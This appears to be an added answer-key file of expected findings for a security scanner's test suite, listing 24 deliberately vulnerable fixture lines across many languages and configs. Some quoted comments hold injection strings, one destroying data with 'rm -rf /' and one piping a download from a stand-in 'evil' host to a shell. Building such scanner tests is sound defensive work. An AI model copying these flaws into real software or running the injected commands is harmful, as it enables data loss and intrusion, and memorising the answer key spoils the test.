@@ -1,0 +1,292 @@
+{
+  "findings": [
+    {
+      "id": "G1",
+      "severity": "CRITICAL",
+      "category": "sqli",
+      "file": "fixtures/vuln_sqli.py",
+      "lines": [
+        5,
+        5
+      ],
+      "quote": "cur.execute(f\"SELECT * FROM users WHERE id = {uid}\")",
+      "cve": null
+    },
+    {
+      "id": "G2",
+      "severity": "CRITICAL",
+      "category": "cmdi",
+      "file": "fixtures/vuln_cmdi.py",
+      "lines": [
+        4,
+        4
+      ],
+      "quote": "subprocess.check_output(f\"ping -c1 {host}\", shell=True)",
+      "cve": null
+    },
+    {
+      "id": "G3",
+      "severity": "HIGH",
+      "category": "path",
+      "file": "fixtures/vuln_path.py",
+      "lines": [
+        5,
+        5
+      ],
+      "quote": "with open(os.path.join(\"/data\", name)) as f:",
+      "cve": null
+    },
+    {
+      "id": "G4",
+      "severity": "HIGH",
+      "category": "overflow",
+      "file": "fixtures/vuln_overflow.c",
+      "lines": [
+        4,
+        4
+      ],
+      "quote": "strcpy(buf, input);",
+      "cve": null
+    },
+    {
+      "id": "L5",
+      "severity": "HIGH",
+      "category": "prototype",
+      "file": "fixtures/vuln_protopollution.js",
+      "lines": [
+        8,
+        8
+      ],
+      "quote": "dst[k] = src[k];           // __proto__ from req.body pollutes Object.prototype",
+      "cve": null
+    },
+    {
+      "id": "L6",
+      "severity": "CRITICAL",
+      "category": "cmdi",
+      "file": "fixtures/vuln_cmdi.go",
+      "lines": [
+        10,
+        10
+      ],
+      "quote": "cmd := exec.Command(\"sh\", \"-c\", \"ping -c1 \"+host) // host=\"x; rm -rf /\" \u2192 RCE (gosec G204)",
+      "cve": null
+    },
+    {
+      "id": "L7",
+      "severity": "CRITICAL",
+      "category": "deserial",
+      "file": "fixtures/vuln_deser.java",
+      "lines": [
+        7,
+        7
+      ],
+      "quote": "Object obj = new ObjectInputStream(req.getInputStream()).readObject();",
+      "cve": null
+    },
+    {
+      "id": "L8",
+      "severity": "HIGH",
+      "category": "lifetime",
+      "file": "fixtures/vuln_uaf.cpp",
+      "lines": [
+        4,
+        4
+      ],
+      "quote": "int& first = v[0];          // reference into the buffer",
+      "cve": null
+    },
+    {
+      "id": "L9",
+      "severity": "CRITICAL",
+      "category": "deserial",
+      "file": "fixtures/vuln_deser.cs",
+      "lines": [
+        6,
+        6
+      ],
+      "quote": "var obj = new BinaryFormatter().Deserialize(req.Body);",
+      "cve": null
+    },
+    {
+      "id": "L10",
+      "severity": "CRITICAL",
+      "category": "object-injection",
+      "file": "fixtures/vuln_unserialize.php",
+      "lines": [
+        4,
+        4
+      ],
+      "quote": "$data = unserialize($_GET[\"state\"]);",
+      "cve": null
+    },
+    {
+      "id": "L11",
+      "severity": "HIGH",
+      "category": "unsafe",
+      "file": "fixtures/vuln_unsafe.rs",
+      "lines": [
+        4,
+        4
+      ],
+      "quote": "let s = unsafe { std::slice::from_raw_parts(buf.as_ptr(), len) };",
+      "cve": null
+    },
+    {
+      "id": "L12",
+      "severity": "CRITICAL",
+      "category": "cmdi",
+      "file": "fixtures/vuln_cmdi.sh",
+      "lines": [
+        5,
+        5
+      ],
+      "quote": "eval \"tar -xf $archive -C $dest\"   # archive='x.tar; curl evil|sh' -> RCE; also word-splits",
+      "cve": null
+    },
+    {
+      "id": "L13",
+      "severity": "CRITICAL",
+      "category": "sqli",
+      "file": "fixtures/vuln_sqli.kt",
+      "lines": [
+        6,
+        6
+      ],
+      "quote": "val rs = stmt.executeQuery(\"SELECT * FROM users WHERE id = $id\")",
+      "cve": null
+    },
+    {
+      "id": "L14",
+      "severity": "HIGH",
+      "category": "tls",
+      "file": "fixtures/vuln_tls.dart",
+      "lines": [
+        6,
+        6
+      ],
+      "quote": "client.badCertificateCallback = (cert, host, port) => true; // accepts ANY cert",
+      "cve": null
+    },
+    {
+      "id": "L15",
+      "severity": "HIGH",
+      "category": "tls",
+      "file": "fixtures/vuln_tls.swift",
+      "lines": [
+        7,
+        7
+      ],
+      "quote": "completionHandler(.useCredential, URLCredential(trust: trust)) // accepts every server cert",
+      "cve": null
+    },
+    {
+      "id": "L16",
+      "severity": "HIGH",
+      "category": "docker",
+      "file": "fixtures/vuln.Dockerfile",
+      "lines": [
+        5,
+        5
+      ],
+      "quote": "ENV API_KEY=sk_live_51HxbakedIntoLayer   # secret persists in image layers, extractable",
+      "cve": null
+    },
+    {
+      "id": "L17",
+      "severity": "CRITICAL",
+      "category": "k8s",
+      "file": "fixtures/vuln-pod.yaml",
+      "lines": [
+        10,
+        10
+      ],
+      "quote": "privileged: true          # host namespaces + all caps -> trivial node escape",
+      "cve": null
+    },
+    {
+      "id": "L18",
+      "severity": "HIGH",
+      "category": "terraform",
+      "file": "fixtures/vuln-sg.tf",
+      "lines": [
+        7,
+        7
+      ],
+      "quote": "cidr_blocks = [\"0.0.0.0/0\"]   # SSH open to the entire internet",
+      "cve": null
+    },
+    {
+      "id": "L19",
+      "severity": "CRITICAL",
+      "category": "ci",
+      "file": "fixtures/vuln-workflow.yml",
+      "lines": [
+        8,
+        8
+      ],
+      "quote": "ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker PR code (pwn request)",
+      "cve": null
+    },
+    {
+      "id": "L20",
+      "severity": "HIGH",
+      "category": "nginx",
+      "file": "fixtures/vuln-nginx.conf",
+      "lines": [
+        3,
+        3
+      ],
+      "quote": "alias /var/www/files/;     # ...so /files../etc/passwd escapes the directory (off-by-slash)",
+      "cve": null
+    },
+    {
+      "id": "L21",
+      "severity": "HIGH",
+      "category": "iam",
+      "file": "fixtures/vuln-iam.json",
+      "lines": [
+        6,
+        6
+      ],
+      "quote": "\"Action\": \"*\",",
+      "cve": null
+    },
+    {
+      "id": "L22",
+      "severity": "CRITICAL",
+      "category": "redis",
+      "file": "fixtures/vuln-redis.conf",
+      "lines": [
+        1,
+        1
+      ],
+      "quote": "bind 0.0.0.0",
+      "cve": null
+    },
+    {
+      "id": "L23",
+      "severity": "CRITICAL",
+      "category": "postgres",
+      "file": "fixtures/vuln-pg_hba.conf",
+      "lines": [
+        2,
+        2
+      ],
+      "quote": "host    all    all    0.0.0.0/0    trust   # password-less login from the whole internet",
+      "cve": null
+    },
+    {
+      "id": "L24",
+      "severity": "MEDIUM",
+      "category": "graphql",
+      "file": "fixtures/vuln-graphql.js",
+      "lines": [
+        6,
+        6
+      ],
+      "quote": "introspection: true,            // schema map handed to attackers in production",
+      "cve": null
+    }
+  ]
+}
